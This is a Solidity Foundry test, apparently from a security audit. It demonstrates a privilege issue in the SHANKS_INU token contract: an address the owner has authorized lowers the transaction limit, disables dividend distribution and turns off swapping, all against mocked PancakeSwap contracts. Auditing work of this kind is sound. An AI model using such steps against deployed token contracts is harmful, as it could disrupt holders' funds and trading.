// SPDX-License-Identifier: MIT
pragma solidity 0.8.5;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/SHANKS_INU.sol";

contract MockFactory {
    function createPair(address, address) external pure returns (address) {
        return address(0x2222222222222222222222222222222222222222);
    }
}

contract MockRouter {
    address private constant FACTORY_ADDRESS = 0x1111111111111111111111111111111111111111;

    function factory() external pure returns (address) {
        return FACTORY_ADDRESS;
    }

    function WETH() external pure returns (address) {
        return address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);
    }
}

contract SHANKS_INUPrivilegeTest is Test {
    SHANKS_INU token;
    
    address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant MOCK_FACTORY = 0x1111111111111111111111111111111111111111;
    
    address owner = address(0x123);
    address attacker = address(0x456);
    address user = address(0x789);
    address constant presaler = address(0x410876C017bab6C4C9c595c34F6F21648847BEeD);

    function setUp() public {
        // Deploy and setup mock contracts at fixed addresses
        MockFactory mockFactory = new MockFactory();
        MockRouter mockRouter = new MockRouter();
        
        vm.etch(MOCK_FACTORY, address(mockFactory).code);
        vm.etch(PANCAKE_ROUTER, address(mockRouter).code);
                
        // Deploy token contract
        token = new SHANKS_INU();
        
        // Transfer ownership to test owner
        token.transferOwnership(payable(owner));
    }

    function testPrivilegeEscalation() public {
        // Get initial state BEFORE attack
        console.log("--- BEFORE-Trigger State ---");
        uint256 maxTxAmountBefore = token._maxTxAmount();
        bool swapEnabledBefore = token.swapEnabled();
        
        console.log("Initial maxTxAmount: %s", maxTxAmountBefore);
        console.log("Initial swapEnabled: %s", swapEnabledBefore);

        console.log("--- TRIGGERING Attacker Actions ---");
        // Owner authorizes attacker
        vm.prank(owner);
        token.authorize(attacker);
        
        // Calculate and set min transaction limit
        uint256 minTxLimit = token.totalSupply() / 10000;
        vm.prank(attacker);
        token.setTxLimit(minTxLimit);
        
        // Verify transfers above limit are blocked
        vm.prank(presaler);
        token.transfer(attacker, minTxLimit * 2);
        
        uint256 transferAmount = minTxLimit + 1;
        vm.prank(attacker);
        vm.expectRevert();
        token.transfer(user, transferAmount);
        
        // Attack 2: Disable dividend distributions
        vm.prank(attacker);
        token.setDistributionCriteria(0, 0);
        
        // Attack 3: Disable swapping mechanism
        vm.prank(attacker);
        token.setSwapBackSettings(false, 100);

        // Get final state AFTER attack
        console.log("--- AFTER-Trigger State ---");
        uint256 maxTxAmountAfter = token._maxTxAmount();
        bool swapEnabledAfter = token.swapEnabled();
        
        console.log("Final maxTxAmount: %s", maxTxAmountAfter);
        console.log("Final swapEnabled: %s", swapEnabledAfter);
        
        // Verify expected changes
        bool maxTxChanged = (maxTxAmountAfter == minTxLimit);
        bool swapDisabled = !swapEnabledAfter;
        
        console.log("Critical changes detected:");
        console.log(" - maxTxAmount reduced: %s", maxTxChanged);
        console.log(" - swapEnabled disabled: %s", swapDisabled);
        
        // Vulnerability exists if both critical states were changed
        if (maxTxChanged && swapDisabled) {
            console.log("Vulnerability Exists: Attacker modified critical parameters");
        } else {
            console.log("Vulnerability not Exist: Critical parameters unchanged");
        }
    }
}